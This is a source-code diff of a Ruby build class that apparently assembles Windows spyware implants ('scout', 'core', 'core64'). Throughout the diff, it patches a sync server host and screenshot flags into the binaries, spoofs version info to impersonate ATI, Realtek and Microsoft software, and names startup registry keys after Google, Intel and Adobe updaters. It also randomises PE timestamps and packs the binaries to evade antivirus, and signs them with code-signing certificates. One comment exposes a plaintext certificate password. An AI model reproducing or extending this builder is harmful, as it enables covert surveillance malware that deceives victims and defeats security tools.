@@ -35,86 +35,87 @@ class BuildWindows < Build
     # invoke the generic patch method with the new params
     super
 
-    if File.exist? path('scout')
-      params[:core] = 'scout'
-      params[:config] = nil
-      # invoke the generic patch method with the new params
-      super
-      patch_file(:file => 'scout') do |content|
-        begin
-          host = @factory.configs.first.sync_host
-          raise "Sync host not found" unless host
-          content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
-        rescue
-          raise "Sync marker not found"
-        end
+    # patch the core64
+    params[:core] = 'core64'
+    params[:config] = nil
+    super
+
+    # patch the scout
+    params[:core] = 'scout'
+    params[:config] = nil
+    super
+
+    marker = nil
+
+    trace :debug, "Patching scout for sync and shot"
+
+    patch_file(:file => 'scout') do |content|
+      begin
+      host = @factory.configs.first.sync_host
+      raise "Sync host not found" unless host
+      marker = "Sync"
+      content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
+
+      marker = "Screenshot"
+      content.binary_patch 'SHOT', @factory.configs.first.screenshot_enabled? ? "\x00\x00\x00\x00" : "\x01\x01\x01\x01"
+
+      marker = "Module name"
+      content.binary_patch 'MODUNAME', module_name('scout')
+      rescue Exception => e
+        raise "#{marker} marker not found: #{e.message}"
       end
     end
 
-    # calculate the function name for the dropper
-    @funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]
+    trace :debug, "Patching core function names and registry"
 
     patch_file(:file => 'core') do |content|
       begin
         # patching for the function name
         marker = "Funcname"
-        content.binary_patch 'PFTBBP', @funcname
+        patch_func_names(content)
 
-        # patching the build time (for kaspersky)
-        marker = "Build time"
-        offset = content.index("PE\x00\x00")
-        raise "offset is nil" if offset.nil?
-        content.binary_patch_at_offset offset + 8, SecureRandom.random_bytes(4)
+        marker = 'dllname'
+       content.binary_patch 'MODUNAME', module_name('core')
 
         # the new registry key
         marker = "Registry key"
         content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
-        # and the old one (previous method)
-        core = scramble_name(@factory.seed, 3)
-        dir = scramble_name(core[0..7], 7)
-        reg = '*' + scramble_name(dir, 1)[1..-1]
-        content.binary_patch 'IaspdPDuFMfnm_apggLLL712j', reg.ljust(25, "\x00")
-      rescue
-        raise "#{marker} marker not found"
+      rescue Exception => e
+        raise "#{marker} marker not found: #{e.message}"
       end
     end
 
-    # we have an exception here, the core64 must be patched only with some values
+    trace :debug, "Patching core64 function names and registry"
 
+    # we have an exception here, the core64 must be patched only with some values
     patch_file(:file => 'core64') do |content|
       begin
         # patching for the function name
         marker = "Funcname"
-        content.binary_patch 'PFTBBP', @funcname
+        patch_func_names(content)
 
-        # per-customer signature
-        marker = "Signature"
-        sign = ::Signature.where({scope: 'agent'}).first
-        signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
-        marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
-        magic = LicenseManager.instance.limits[:magic] + marker.slice(8..-1)
-        content.binary_patch marker, signature
+        marker = 'dllname'
+        content.binary_patch 'MODUNAME', module_name('core64')
 
         # the new registry key
         marker = "Registry key"
         content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
-      rescue
-        raise "#{marker} marker not found"
+      rescue Exception => e
+        raise "#{marker} marker not found: #{e.message}"
       end
     end
+
+    # patching the build time
+    patch_build_time('scout')
+    patch_build_time('core')
+    patch_build_time('core64')
+    patch_build_time('codec')
+    patch_build_time('sqlite')
+    patch_build_time('silent')
 
     # code obfuscator
     CrossPlatform.exec path('packer32'), "#{path('core')}"
     CrossPlatform.exec path('packer64'), "#{path('core64')}"
-
-    # signature for the patched code
-    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("globalsign.cer")} #{path('core')}" if to_be_signed?(params)
-    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("globalsign.cer")} #{path('core64')}" if to_be_signed?(params)
-
-    # add random bytes to codec, rapi and sqlite
-    CrossPlatform.exec path('packer'), "#{path('codec')}"
-    add_random(path('sqlite'))
-
   end
 
   def scramble
@@ -128,7 +129,7 @@ class BuildWindows < Build
     driver = scramble_name(config, 4)
     driver64 = scramble_name(config, 16)
     core64 = scramble_name(config, 15)
-    oldreg = '*' + scramble_name(dir, 1)[1..-1]
+    oldreg = old_reg_start_key(@factory.confkey)
     reg = reg_start_key(@factory.confkey)
 
     @scrambled = {core: core, core64: core64, driver: driver, driver64: driver64,
@@ -146,8 +147,8 @@ class BuildWindows < Build
     @appname = params['appname'] || 'agent'
 
     # parse the parameters
-    @cooked = (params['cooked'] == true) ? true : false
-    @admin = (params['admin'] == true) ? true : false
+    @cooked = params['cooked'] ? true : false
+    @admin = params['admin'] ? true : false
     @bit64 = (params['bit64'] == false) ? false : true
     @codec = (params['codec'] == false) ? false : true
     @scout = (params['scout'] == false) ? false : true
@@ -160,6 +161,8 @@ class BuildWindows < Build
 
     # change the icon of the exec accordingly to the name
     customize_scout(@factory.confkey, params['icon']) if @scout
+
+    trace :debug, "Build: melting mode: #{melting_mode}"
 
     case melting_mode
       when :silent
@@ -189,7 +192,7 @@ class BuildWindows < Build
     return if @cooked or @melted
 
     # perform the signature
-    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("globalsign.cer")} #{path('output')}" if to_be_signed?(params)
+    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('output')}" if to_be_signed?(params)
   end
 
   def pack(params)
@@ -210,6 +213,10 @@ class BuildWindows < Build
       add_magic(core_content)
       File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
 
+      core_content = z.file.open('core64', "rb") { |f| f.read }
+      add_magic(core_content)
+      File.open(Config.instance.temp('core64'), "wb") {|f| f.write core_content}
+
       core_content = z.file.open('scout', "rb") { |f| f.read }
       add_magic(core_content)
       File.open(Config.instance.temp('scout'), "wb") {|f| f.write core_content}
@@ -219,35 +226,22 @@ class BuildWindows < Build
     CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
     FileUtils.rm_rf Config.instance.temp('core')
 
+    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core64')}"
+    FileUtils.rm_rf Config.instance.temp('core64')
+
     CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('scout')}"
     FileUtils.rm_rf Config.instance.temp('scout')
   end
 
-  def ghost(params)
-    trace :debug, "Build: ghost: #{params}"
+  def scout_name(seed)
+    scout_names = [{name: 'CCC', version: '3.5.0.5', desc: 'Catalys Control Center: Host application',company: 'ATI Technologies Inc.', copyright: '2002-2010'},
+                   {name: 'PDVD9Serv', version: '9.0.3401.1', desc: 'PowerDVD RC Service', company: 'CyberLink Corp.', copyright: 'Copyright (c) CyberLink Corp. 1997-2008'},
+                   {name: 'RtDCpl', version: '1.0.0.12', desc: 'HD Audio Control Panel', company: 'Realtek Semiconductor Corp.', copyright: 'Copyright 2010 (c) Realtek Semiconductor Corp.. All rights reserved.'},
+                   {name: 'sllauncher', version: '5.1.10411.3', desc: 'Microsoft Silverlight Out-of-Browser Launcher', company: 'Microsoft Silverlight', copyright: 'Copyright (c) Microsoft Corporation.All rights reserved.'},
+                   {name: 'WLIDSVCM', version: '7.250.4225.2', desc: 'Microsoft (r) Windows Live ID Service Monitor', company: 'Microsoft (r) CoReXT', copyright: 'Copyright (c) Microsoft Corporation.All rights reserved.'}
+                  ]
 
-    # patching for the ghost
-    patch_file(:file => 'ghost') do |content|
-      begin
-        offset = content.index("ADDRESS1")
-        raise "address1 not found" if offset.nil?
-        content.binary_patch_at_offset offset, params[:sync][0]
-        offset = content.index("ADDRESS2")
-        raise "address2 not found" if offset.nil?
-        content.binary_patch_at_offset offset, params[:sync][1]
-
-        sign = ::Signature.where({scope: 'agent'}).first
-        signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
-        content.binary_patch '3j9WmmDgBqyU270FTid3719g64bP4s52', signature
-
-        content.binary_patch "\xe1\xbe\xad\xde".force_encoding('ASCII-8BIT'), [params[:build]].pack('I').force_encoding('ASCII-8BIT')
-        content.binary_patch "\xe2\xbe\xad\xde".force_encoding('ASCII-8BIT'), [params[:instance]].pack('I').force_encoding('ASCII-8BIT')
-      rescue Exception => e
-        trace :error, e.message
-        trace :fatal, e.backtrace.join("\n")
-        raise "Ghost marker not found: #{e.message}"
-      end
-    end
+    scout_names[seed.ord % scout_names.size]
   end
 
   private
@@ -276,11 +270,10 @@ class BuildWindows < Build
         f.puts "HSYS=ndisk.sys"
         f.puts "HKEY=#{key}"
         f.puts "MANIFEST=" + (@admin ? 'yes' : 'no')
-        f.puts "FUNC=" + @funcname
+        f.puts "FUNC=" + "#{@funcnames[5]},#{@funcnames[8]}"
         f.puts "INSTALLER=" + (@cooked ? 'no' : 'yes')
       end
       cook_param = '-C -R ' + path('') + ' -O ' + path('output')
-      cook_param += " -d #{path('demo_image')}" if @demo
     end
 
     CrossPlatform.exec path('cooker'), cook_param
@@ -300,14 +293,28 @@ class BuildWindows < Build
       # we have a static var of 1 MiB
       raise "cooked file is too big" if cooked.bytesize > 1024*1024
 
-      silent_file = @admin ? 'silent_admin' : 'silent'
+      patch_file(:file => 'silent') do |content|
+        begin
+          offset = content.index("\xef\xbe\xad\xde".force_encoding('ASCII-8BIT'))
+          raise "offset is nil" if offset.nil?
+          content.binary_patch_at_offset offset, cooked
+        rescue Exception => e
+          raise "Room for cooked not found: #{e.message}"
+        end
+      end
 
+=begin
       content = File.open(path(silent_file), 'rb') {|f| f.read}
       offset = content.index("\xef\xbe\xad\xde".force_encoding('ASCII-8BIT'))
       raise "offset is nil" if offset.nil?
       output = content.binary_patch_at_offset offset, cooked
 
       File.open(path('output'), 'wb') {|f| f.write output}
+
+=end
+      # delete the cooked output file and overwrite it with the silent output
+      FileUtils.rm_rf path('output')
+      FileUtils.cp path('silent'), path('output')
     end
   end
 
@@ -330,8 +337,7 @@ class BuildWindows < Build
                                           (@codec ? path(@scrambled[:codec]) : 'null') +' '+
                                           @scrambled[:dir]+' '+
                                           (@admin ? '1' : '0') +' '+
-                                          @funcname +' '+
-                                          (@demo ? path('demo_image') : 'null') +' '+
+                                          "#{@funcnames[5]},#{@funcnames[8]}" +' '+
                                           path('input') + ' ' +
                                           path('output')
     end
@@ -365,20 +371,29 @@ class BuildWindows < Build
   end
 
   def reg_start_key(seed)
-    fakever = (seed[2].ord % 11).to_s + "." + seed.slice(0..2).unpack('S').first.to_s
+    fakever = (seed[2].ord % 10).to_s + '.' + (seed.slice(0..2).unpack('S').first % 100).to_s
+
+    fake_names = ['Restore Point',      'Backup Status',    'HD Audio',         'HD Audio balance', 'Bluetooth Pairing',
+                  'Intel(R) Interface', 'Intel PROSet',     'Delayed launcher', 'Intel USB Device', 'Smart Connect',
+                  'Java(TM) SE update', 'Audio Background', 'Wifi Manager',     'Adobe(R) Updater', 'Google Update',
+                  'Broadcom WiFi',      'Intel(R) Wifi',    'Track Gestures',   'Wifi Assistant',   'Flash Update'
+                 ]
+
+    # the name must be less than 23
+    name = fake_names[seed.ord % fake_names.size] + ' ' + fakever
+
+    raise "Registry key name too long" if name.length > 23
+
+    return name
+  end
+
+  def old_reg_start_key(seed)
+    fakever = (seed[2].ord % 11).to_s + '.' + seed.slice(0..2).unpack('S').first.to_s
 
     fake_names = ['wmiprvse', 'lssas', 'dllhost', 'IconStor', 'wsus', 'MSInst', 'WinIME',
                   'RSSFeed', 'IconDB', 'MSCache', 'IEPrefs', 'EVTvwr', 'TServer', 'SMBAuth',
                   'DRM', 'Recovery', 'Registry', 'Cookies', 'MSVault', 'MSDiag', 'MSHelp']
-    fake_names[seed.ord % fake_names.size] + " " + fakever
-  end
-
-  def scout_name(seed)
-    scout_names = [{name: 'btassist', version: '7.0.0.0', desc: 'Bluetooth Assistant', company: 'TOSHIBA CORPORATION', copyright: 'Copyright (C) 2009 TOSHIBA CORPORATION, All rights reserved.'},
-                   {name: 'IAStorIcon', version: '10.1.0.1008', desc: 'IAStorIcon', company: 'INTEL CORPORATION', copyright: 'Copyright (c) Intel Corporation 2009-2010'},
-                   {name: 'PrivacyIconClient', version: '7.1.20.1119', desc: 'Intel(R) Management and Security Status', company: 'INTEL CORPORATION', copyright: 'Copyright (c) 2007-2011 Intel Corporation'}]
-
-    scout_names[seed.ord % scout_names.size]
+    fake_names[seed.ord % fake_names.size] + ' ' + fakever
   end
 
   def customize_scout(seed, icon)
@@ -408,8 +423,12 @@ class BuildWindows < Build
     # change the infos
     CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
 
+    # pack the scout
+    CrossPlatform.exec path('packer32'), "#{path('scout')}"
+
     # sign it
-    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('scout')}" if to_be_signed?
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("digicert.cer")} #{path('scout')}" if to_be_signed?
+    #CrossPlatform.exec path('signtool'), "sign /P GeoMornellaChallenge7 /f #{Config.instance.cert("HT.pfx")} #{path('scout')}" if to_be_signed?
   end
 
   def customize_icon(file, icon)
@@ -424,6 +443,61 @@ class BuildWindows < Build
 
     # change the infos
     CrossPlatform.exec path('verpatch'), "/fn /va #{file} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
+  end
+
+  def patch_build_time(file)
+    patch_file(:file => file) do |content|
+      begin
+        offset = content.index("PE\x00\x00")
+        raise if offset.nil?
+        # random time is NOW - rand(two year) (3600*24*365*2 -> 63072000)
+        time = Time.now.to_i + rand(-63072000..0)
+        content.binary_patch_at_offset offset + 8, [time].pack('I')
+      rescue
+        raise "build time offset not found"
+      end
+    end
+  end
+
+  def patch_func_names(content)
+    # calculate the function name for the dropper
+    @funcnames = []
+
+    (1..12).each do |index|
+      # take the first letter (ignore nums) of the log key
+      # it must be a letter since it's a function name
+      first_alpha = @factory.logkey.match(/[a-zA-Z]/)[0]
+      progressive = ('A'.ord + first_alpha.ord % 10 + index).chr
+      @funcnames[index] = first_alpha + Digest::MD5.digest(@factory.logkey + LicenseManager.instance.limits[:magic]).unpack('H*').first[0..7] + progressive
+    end
+
+    (1..12).each do |index|
+      find = "PPPFTBBP%02d" % index
+
+      trace :debug, "FUNC: #{find} -> #{@funcnames[index]}" if content[find]
+
+      content.binary_patch find, @funcnames[index] if content[find]
+    end
+    content
+  end
+
+  def module_name(file)
+    # take the first letter (ignore nums) of the log key
+    # it must be a letter since it's a function name
+    first_alpha = @factory.logkey.match(/[a-zA-Z]/)[0]
+
+    progressive = '0'
+
+    case file
+      when 'core'
+        progressive = ('A'.ord + (first_alpha.ord + 32) % 26).chr
+      when 'core64'
+        progressive = ('A'.ord + (first_alpha.ord + 64) % 26).chr
+      when 'scout'
+        progressive = ('A'.ord + (first_alpha.ord + 17) % 26).chr
+    end
+
+    first_alpha + SecureRandom.hex(1) + progressive + LicenseManager.instance.limits[:magic][4..7]
   end
 
 end
